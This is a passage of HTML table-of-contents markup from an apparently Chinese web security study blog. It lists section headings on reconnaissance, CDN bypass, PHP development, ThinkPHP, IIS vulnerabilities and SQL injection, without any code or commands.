href=\"#%E4%BA%8C%E3%80%81%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95\"><span class=\"toc-text\">二、绕过方法</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-6\"><a class=\"toc-link\" href=\"#1-%E5%AD%90%E5%9F%9F%E5%90%8D%E6%8C%96%E6%8E%98\"><span class=\"toc-text\">1.子域名挖掘</span></a></li><li class=\"toc-item toc-level-6\"><a class=\"toc-link\" href=\"#2-%E5%8E%86%E5%8F%B2-DNS-%E8%AE%B0%E5%BD%95%E6%9F%A5%E8%AF%A2%EF%BC%88%E8%80%81%E5%9F%9F%E5%90%8D%E9%80%82%E7%94%A8%EF%BC%89\"><span class=\"toc-text\">2.历史 DNS 记录查询（老域名适用）</span></a></li><li class=\"toc-item toc-level-6\"><a class=\"toc-link\" href=\"#3-SSL-%E8%AF%81%E4%B9%A6%E5%8F%8D%E6%9F%A5\"><span class=\"toc-text\">3.SSL 证书反查</span></a></li><li class=\"toc-item toc-level-6\"><a class=\"toc-link\" href=\"#4-%E5%9B%BD%E5%A4%96%E8%8A%82%E7%82%B9%E8%AE%BF%E9%97%AE\"><span class=\"toc-text\">4.国外节点访问</span></a></li><li class=\"toc-item toc-level-6\"><a class=\"toc-link\" href=\"#5-%E9%82%AE%E4%BB%B6%E6%9C%8D%E5%8A%A1%E6%BA%AF%E6%BA%90\"><span class=\"toc-text\">5.邮件服务溯源</span></a></li><li class=\"toc-item toc-level-6\"><a class=\"toc-link\" href=\"#6-%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E8%8E%B7%E5%8F%96\"><span class=\"toc-text\">6.网络空间获取</span></a></li><li class=\"toc-item toc-level-6\"><a class=\"toc-link\" href=\"#7-%E5%85%A8%E9%9D%A2%E6%89%AB%E6%8F%8F\"><span class=\"toc-text\">7.全面扫描</span></a></li><li class=\"toc-item toc-level-6\"><a class=\"toc-link\" href=\"#8-%E9%9D%9E%E6%A0%87%E5%87%86%E7%AB%AF%E5%8F%A3%E6%8E%A2%E6%B5%8B\"><span class=\"toc-text\">8.非标准端口探测</span></a></li><li class=\"toc-item toc-level-6\"><a class=\"toc-link\" href=\"#9-HTTP-%E6%A0%87%E5%A4%B4%E7%AF%A1%E6%94%B9\"><span class=\"toc-text\">9.HTTP 标头篡改</span></a></li><li class=\"toc-item toc-level-6\"><a class=\"toc-link\" href=\"#10-%E5%8D%8F%E8%AE%AE%E5%B7%AE%E5%BC%82%E7%BB%95%E8%BF%87\"><span class=\"toc-text\">10.协议差异绕过</span></a></li><li class=\"toc-item toc-level-6\"><a class=\"toc-link\" href=\"#11-%E6%80%BB%E7%BB%93\"><span class=\"toc-text\">11.总结</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#8-%E6%A1%86%E6%9E%B6%E7%BB%84%E4%BB%B6\"><span class=\"toc-text\">8.框架组件</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E4%B8%80%E3%80%81%E5%9F%BA%E7%A1%80%E5%86%85%E5%AE%B9\"><span class=\"toc-text\">一、基础内容</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E4%BA%8C%E3%80%81%E6%A1%86%E6%9E%B6%E8%AF%86%E5%88%AB%E7%89%B9%E5%BE%81\"><span class=\"toc-text\">二、框架识别特征</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-6\"><a class=\"toc-link\" href=\"#python-%E5%BC%80%E5%8F%91%E6%A1%86%E6%9E%B6\"><span class=\"toc-text\">python-开发框架</span></a></li><li class=\"toc-item toc-level-6\"><a class=\"toc-link\" href=\"#PHP-%E5%BC%80%E5%8F%91%E6%A1%86%E6%9E%B6\"><span class=\"toc-text\">PHP-开发框架</span></a></li><li class=\"toc-item toc-level-6\"><a class=\"toc-link\" href=\"#JAVA-%E5%BC%80%E5%8F%91%E6%A1%86%E6%9E%B6\"><span class=\"toc-text\">JAVA-开发框架</span></a></li></ol></li></ol></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E4%BA%8C%E3%80%81%E4%B8%BB%E6%9C%BA%E6%9C%8D%E5%8A%A1%E5%99%A8\"><span class=\"toc-text\">二、主机服务器</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#1-%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F\"><span class=\"toc-text\">1.端口扫描</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E4%B8%89%E3%80%81APP-%E5%BA%94%E7%94%A8\"><span class=\"toc-text\">三、APP 应用</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#1-%E4%BF%A1%E6%81%AF%E5%88%86%E7%B1%BB\"><span class=\"toc-text\">1.信息分类</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#2-%E8%8E%B7%E5%8F%96-APP\"><span class=\"toc-text\">2.获取 APP</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#3-%E6%8F%90%E5%8F%96%E6%8A%80%E6%9C%AF\"><span class=\"toc-text\">3.提取技术</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%EF%BC%881%EF%BC%89%E6%8A%93%E5%8C%85%E8%A1%A8%E7%8E%B0%E5%87%BA%E6%9D%A5%E7%9A%84%E6%95%B0%E6%8D%AE\"><span class=\"toc-text\">（1）抓包表现出来的数据</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%EF%BC%882%EF%BC%89%E5%8F%8D%E7%BC%96%E8%AF%91%E4%BB%8E%E6%BA%90%E7%A0%81%E4%B8%AD%E6%8F%90%E5%8F%96%E6%95%B0%E6%8D%AE\"><span class=\"toc-text\">（2）反编译从源码中提取数据</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%EF%BC%883%EF%BC%89%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95%E4%BB%8E%E8%A1%A8%E7%8E%B0%E4%B8%AD%E6%8F%90%E5%8F%96%E6%95%B0%E6%8D%AE\"><span class=\"toc-text\">（3）动态调试从表现中提取数据</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%9B%9B%E3%80%81%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%BA%94%E7%94%A8\"><span class=\"toc-text\">四、小程序应用</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#1-%E8%8E%B7%E5%8F%96%E5%B0%8F%E7%A8%8B%E5%BA%8F\"><span class=\"toc-text\">1.获取小程序</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#2-%E5%B0%8F%E7%A8%8B%E5%BA%8F%E7%BB%93%E6%9E%84\"><span class=\"toc-text\">2.小程序结构</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#3-%E6%8F%90%E5%8F%96%E6%8A%80%E6%9C%AF-2\"><span class=\"toc-text\">3.提取技术</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E4%BA%94%E3%80%81%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7\"><span class=\"toc-text\">五、微信公众号</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%85%AD%E3%80%81%E5%85%B6%E4%BB%96\"><span class=\"toc-text\">六、其他</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#1-Github-%E7%9B%91%E6%8E%A7-%E5%BC%80%E5%8F%91-%E9%85%8D%E7%BD%AE-%E6%BA%90%E7%A0%81\"><span class=\"toc-text\">1.Github 监控-开发&amp;配置&amp;源码</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#2-%E7%BD%91%E7%9B%98%E8%B5%84%E6%BA%90%E6%90%9C%E7%B4%A2-%E5%85%A8%E5%B1%80%E6%96%87%E4%BB%B6%E6%9C%BA%E5%AF%86\"><span class=\"toc-text\">2.网盘资源搜索-全局文件机密</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#3-%E6%95%8F%E6%84%9F%E7%9B%AE%E5%BD%95%E6%96%87%E4%BB%B6-%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F-%E7%88%AC%E8%99%AB\"><span class=\"toc-text\">3.敏感目录文件-目录扫描&amp;爬虫</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#4-%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E8%BF%9B%E9%98%B6-%E8%AF%81%E4%B9%A6-%E5%9B%BE%E6%A0%87-%E9%82%AE%E7%AE%B1\"><span class=\"toc-text\">4.网络空间进阶-证书&amp;图标&amp;邮箱</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E8%AF%81%E4%B9%A6%E8%B5%84%E4%BA%A7\"><span class=\"toc-text\">证书资产</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E4%B8%83%E3%80%81%E7%BA%A2%E8%93%9D%E9%98%9F%E5%B7%A5%E5%85%B7\"><span class=\"toc-text\">七、红蓝队工具</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#1-%E5%90%84%E7%B1%BB%E7%BA%A2%E8%93%9D%E9%98%9F%E4%BC%98%E7%A7%80%E5%B7%A5%E5%85%B7%E9%A1%B9%E7%9B%AE%E9%9B%86%E5%90%88\"><span class=\"toc-text\">1.各类红蓝队优秀工具项目集合</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#2-%E8%87%AA%E5%8A%A8%E5%8C%96-%E6%AD%A6%E5%99%A8%E5%BA%93%E9%83%A8%E7%BD%B2-F8x\"><span class=\"toc-text\">2.自动化-武器库部署-F8x</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#3-%E8%87%AA%E5%8A%A8%E5%8C%96-%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4-Asamf\"><span class=\"toc-text\">3.自动化-网络空间-Asamf</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#4-%E8%87%AA%E5%8A%A8%E5%8C%96-%E4%BC%81%E6%9F%A5%E4%BF%A1%E6%81%AF-ENScan\"><span class=\"toc-text\">4.自动化-企查信息-ENScan</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#5-%E7%BB%BC%E5%90%88%E8%87%AA%E5%8A%A8%E5%8C%96%E9%A1%B9%E7%9B%AE-nemo\"><span class=\"toc-text\">5.综合自动化项目-nemo</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%85%AB%E3%80%81%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE-2\"><span class=\"toc-text\">八、思维导图</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91\"><span class=\"toc-text\">安全开发</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#PHP-%E5%BC%80%E5%8F%91\"><span class=\"toc-text\">PHP 开发</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E4%B8%80%E3%80%81PHP-%E5%9F%BA%E7%A1%80\"><span class=\"toc-text\">一、PHP 基础</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E5%BC%95%E5%8F%B7%E5%AF%B9%E6%AF%94\"><span class=\"toc-text\">引号对比</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#PHP-%E5%8F%98%E9%87%8F\"><span class=\"toc-text\">PHP 变量</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#PHP-echo-%E5%92%8C-print-%E8%AF%AD%E5%8F%A5\"><span class=\"toc-text\">PHP echo 和 print 语句</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#PHP-%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B\"><span class=\"toc-text\">PHP 数据类型</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#PHP-%E7%B1%BB%E5%9E%8B%E6%AF%94%E8%BE%83\"><span class=\"toc-text\">PHP 类型比较</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#PHP-%E5%B8%B8%E9%87%8F\"><span class=\"toc-text\">PHP 常量</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#PHP-%E5%AD%97%E7%AC%A6%E4%B8%B2\"><span class=\"toc-text\">PHP 字符串</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E6%9D%A1%E4%BB%B6%E8%AF%AD%E5%8F%A5\"><span class=\"toc-text\">条件语句</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E6%95%B0%E7%BB%84\"><span class=\"toc-text\">数组</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E6%95%B0%E7%BB%84%E6%8E%92%E5%BA%8F\"><span class=\"toc-text\">数组排序</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E8%B6%85%E7%BA%A7%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F\"><span class=\"toc-text\">超级全局变量</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#PHP-%E5%BE%AA%E7%8E%AF\"><span class=\"toc-text\">PHP 循环</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#PHP-%E5%87%BD%E6%95%B0\"><span class=\"toc-text\">PHP 函数</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#PHP-%E9%AD%94%E6%9C%AF%E5%B8%B8%E9%87%8F\"><span class=\"toc-text\">PHP 魔术常量</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#PHP-%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4%EF%BC%88namespqce%EF%BC%89\"><span class=\"toc-text\">PHP 命名空间（namespqce）</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#PHP-%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1\"><span class=\"toc-text\">PHP 面向对象</span></a></li></ol></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E4%BA%8C%E3%80%81PHP-%E7%95%99%E8%A8%80%E6%9D%BF%E5%8A%9F%E8%83%BD-%E8%B6%85%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%93%8D%E4%BD%9C\"><span class=\"toc-text\">二、PHP 留言板功能&amp;超全局变量&amp;数据库操作</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AF%BC%E5%85%A5-mysql-%E6%9E%B6%E6%9E%84-%E5%BA%93%E8%A1%A8%E5%88%97\"><span class=\"toc-text\">数据库导入-mysql 架构&amp;库表列</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E6%95%B0%E6%8D%AE%E5%BA%93%E6%93%8D%E4%BD%9C-mysql-%E5%87%BD%E6%95%B0-%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5\"><span class=\"toc-text\">数据库操作-mysql 函数&amp;增删改查</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8E%A5%E5%8F%97%E8%BE%93%E5%87%BA-html-%E6%B7%B7%E7%BC%96-%E8%B6%85%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F\"><span class=\"toc-text\">数据库接受输出-html 混编&amp;超全局变量</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E7%AC%AC%E4%B8%89%E6%96%B9%E6%8F%92%E4%BB%B6%E5%BC%95%E7%94%A8-js-%E4%BC%A0%E5%8F%82-%E5%87%BD%E6%95%B0%E5%AF%B9%E8%B1%A1%E8%B0%83%E7%94%A8\"><span class=\"toc-text\">第三方插件引用-js 传参&amp;函数对象调用</span></a></li></ol></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E4%B8%89%E3%80%81PHP-%E5%BA%94%E7%94%A8-%E5%90%8E%E5%8F%B0%E6%A8%A1%E5%9D%97-Session-Cookie-Token-%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81-%E5%94%AF%E4%B8%80%E6%80%A7\"><span class=\"toc-text\">三、PHP 应用&amp;后台模块&amp;Session&amp;Cookie&amp;Token&amp;身份验证&amp;唯一性</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81-cookie-%E4%BD%BF%E7%94%A8\"><span class=\"toc-text\">身份验证-cookie 使用</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81-Session-%E4%BD%BF%E7%94%A8\"><span class=\"toc-text\">身份验证-Session 使用</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E5%94%AF%E4%B8%80%E6%80%A7%E5%88%A4%E6%96%AD-Token-%E4%BD%BF%E7%94%A8\"><span class=\"toc-text\">唯一性判断-Token 使用</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E5%85%B7%E4%BD%93%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86%E7%82%B9\"><span class=\"toc-text\">具体安全知识点</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-6\"><a class=\"toc-link\" href=\"#Cookie-%E5%92%8C-Session\"><span class=\"toc-text\">Cookie 和 Session</span></a></li><li class=\"toc-item toc-level-6\"><a class=\"toc-link\" href=\"#Token\"><span class=\"toc-text\">Token</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%9B%9B%E3%80%81PHP-%E5%BA%94%E7%94%A8-%E6%96%87%E4%BB%B6%E7%AE%A1%E7%90%86%E6%A8%A1%E5%9D%97-%E6%98%BE%E7%A4%BA%E4%B8%8A%E4%BC%A0-%E9%BB%91%E7%99%BD%E5%90%8D%E5%8D%95%E7%B1%BB%E5%9E%8B%E8%BF%87%E6%BB%A4-%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6\"><span class=\"toc-text\">四、PHP 应用&amp;文件管理模块&amp;显示上传&amp;黑白名单类型过滤&amp;访问控制</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E6%96%87%E4%BB%B6%E7%AE%A1%E7%90%86%E6%A8%A1%E5%9D%97-%E4%B8%8A%E4%BC%A0-%E8%BF%87%E6%BB%A4%E6%9C%BA%E5%88%B6\"><span class=\"toc-text\">文件管理模块-上传-过滤机制</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E6%96%87%E4%BB%B6%E7%AE%A1%E7%90%86%E6%A8%A1%E5%9D%97-%E6%98%BE%E7%A4%BA-%E8%BF%87%E6%BB%A4%E6%9C%BA%E5%88%B6\"><span class=\"toc-text\">文件管理模块-显示-过滤机制</span></a></li></ol></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E4%BA%94%E3%80%81PHP-%E5%BA%94%E7%94%A8-%E6%96%87%E4%BB%B6%E7%AE%A1%E7%90%86%E6%A8%A1%E5%9D%97-%E5%8C%85%E5%90%AB-%E4%B8%8A%E4%BC%A0-%E9%81%8D%E5%8E%86-%E5%86%99%E5%85%A5-%E5%88%A0%E9%99%A4-%E4%B8%8B%E8%BD%BD-%E5%AE%89%E5%85%A8\"><span class=\"toc-text\">五、PHP 应用&amp;文件管理模块&amp;包含&amp;上传&amp;遍历&amp;写入&amp;删除&amp;下载&amp;安全</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#PHP-%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E5%AE%89%E5%85%A8\"><span class=\"toc-text\">PHP 文件操作安全</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB\"><span class=\"toc-text\">文件包含</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0\"><span class=\"toc-text\">文件上传</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4\"><span class=\"toc-text\">文件删除</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD\"><span class=\"toc-text\">文件下载</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E6%96%87%E4%BB%B6%E7%BC%96%E8%BE%91\"><span class=\"toc-text\">文件编辑</span></a></li></ol></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%85%AD%E3%80%81PHP-%E5%BA%94%E7%94%A8-%E6%A8%A1%E7%89%88%E5%BC%95%E7%94%A8-Smarty-%E6%B8%B2%E6%9F%93-MVC-%E6%A8%A1%E5%9E%8B-%E6%95%B0%E6%8D%AE%E8%81%94%E5%8A%A8\"><span class=\"toc-text\">六、PHP 应用&amp;模版引用&amp;Smarty 渲染&amp;MVC 模型&amp;数据联动</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E6%96%B0%E9%97%BB%E5%88%97%E8%A1%A8\"><span class=\"toc-text\">新闻列表</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E8%87%AA%E5%86%99%E6%A8%A1%E7%89%88%E5%BA%94%E7%94%A8\"><span class=\"toc-text\">自写模版应用</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#Smarty-%E6%A8%A1%E7%89%88%E5%BC%95%E7%94%A8\"><span class=\"toc-text\">Smarty 模版引用</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E4%BB%A3%E7%A0%81-RCE-%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95\"><span class=\"toc-text\">代码 RCE 安全测试</span></a></li></ol></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E4%B8%83%E3%80%81PHP-%E5%BA%94%E7%94%A8-ThinkPHP-%E6%A1%86%E6%9E%B6-%E8%B7%AF%E7%94%B1%E8%AE%BF%E9%97%AE-%E5%AF%B9%E8%B1%A1%E6%93%8D%E4%BD%9C-%E5%86%85%E7%BD%AE%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87-%E6%A0%B8%E5%BF%83%E6%BC%8F%E6%B4%9E\"><span class=\"toc-text\">七、PHP 应用&amp;ThinkPHP 框架&amp;路由访问&amp;对象操作&amp;内置过滤绕过&amp;核心漏洞</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#TP-%E6%A1%86%E6%9E%B6-%E5%BC%80%E5%8F%91-%E9%85%8D%E7%BD%AE%E6%9E%B6%E6%9E%84-%E8%B7%AF%E7%94%B1-MVC-%E6%A8%A1%E5%9E%8B\"><span class=\"toc-text\">TP 框架-开发-配置架构&amp;路由&amp;MVC 模型</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#TP-%E6%A1%86%E6%9E%B6-%E5%AE%89%E5%85%A8-%E4%B8%8D%E5%AE%89%E5%85%A8%E5%86%99%E6%B3%95-%E7%89%88%E6%9C%AC%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87\"><span class=\"toc-text\">TP 框架-安全-不安全写法&amp;版本过滤绕过</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E\"><span class=\"toc-text\">逻辑漏洞</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#JS-%E5%BC%80%E5%8F%91\"><span class=\"toc-text\">JS 开发</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#JAVA-%E5%BC%80%E5%8F%91\"><span class=\"toc-text\">JAVA 开发</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#WEB-%E6%94%BB%E9%98%B2\"><span class=\"toc-text\">WEB 攻防</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#ASP-%E5%AE%89%E5%85%A8\"><span class=\"toc-text\">ASP 安全</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E9%BB%98%E8%AE%A4%E5%AE%89%E8%A3%85-MDB-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%84%E9%9C%B2%E4%B8%8B%E8%BD%BD\"><span class=\"toc-text\">默认安装-MDB 数据库泄露下载</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#HTTP-sys-%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E\"><span class=\"toc-text\">HTTP.sys 远程执行代码漏洞</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#IIS-%E7%9F%AD%E6%96%87%E4%BB%B6\"><span class=\"toc-text\">IIS 短文件</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#IIS-%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%EF%BC%88IIS-6-%E6%97%A0%E8%A1%A5%E4%B8%81%EF%BC%89\"><span class=\"toc-text\">IIS 文件解析（IIS 6 无补丁）</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#PHP-SQL-%E6%B3%A8%E5%85%A5\"><span class=\"toc-text\">PHP-SQL 注入</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E4%B8%80%E3%80%81%E7%9B%B8%E5%85%B3%E5%9F%BA%E7%A1%80\"><span class=\"toc-text\">一、相关基础</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#1-MYSQL-Web-%E7%BB%84%E6%88%90%E6%9E%B6%E6%9E%84\"><span class=\"toc-text\">1.MYSQL-Web 组成架构</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#2-%E5%B8%B8%E8%A7%84%E6%9F%A5%E8%AF%A2\"><span class=\"toc-text\">2.常规查询</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#3-%E8%B7%A8%E5%BA%93%E6%9F%A5%E8%AF%A2\"><span class=\"toc-text\">3.跨库查询</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#4-%E6%96%87%E4%BB%B6%E7%BB%AD%E5%86%99\"><span class=\"toc-text\">4.文件续写</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#5-%E7%BD%91%E4%B8%8A%E7%9B%B8%E5%85%B3%E8%B5%84%E6%96%99\"><span class=\"toc-text\">5.网上相关资料</span></a></li></ol></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E4%BA%8C%E3%80%81%E5%9F%BA%E7%A1%80%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95\"><span class=\"toc-text\">二、基础绕过方法</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#1-%E6%95%B0%E6%8D%AE%E8%AF%B7%E6%B1%82%E7%B1%BB%E5%9E%8B\"><span class=\"toc-text\">1.数据请求类型</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#2-%E6%95%B0%E6%8D%AE%E8%AF%B7%E6%B1%82%E6%96%B9%E6%B3%95\"><span class=\"toc-text\">2.数据请求方法</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#3-%E6%95%B0%E6%8D%AE%E5%BA%93%E8%AF%B7%E6%B1%82%E6%A0%BC%E5%BC%8F\"><span class=\"toc-text\">3.数据库请求格式</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#4-%E6%96%87%E4%BB%B6%E5%A4%B4%E6%B3%A8%E5%85%A5-%E9%9D%9E%E5%B8%B8%E8%A7%84%E6%B3%A8%E5%85%A5%E8%AF%AD%E5%8F%A5\"><span class=\"toc-text\">4.文件头注入-非常规注入语句</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" 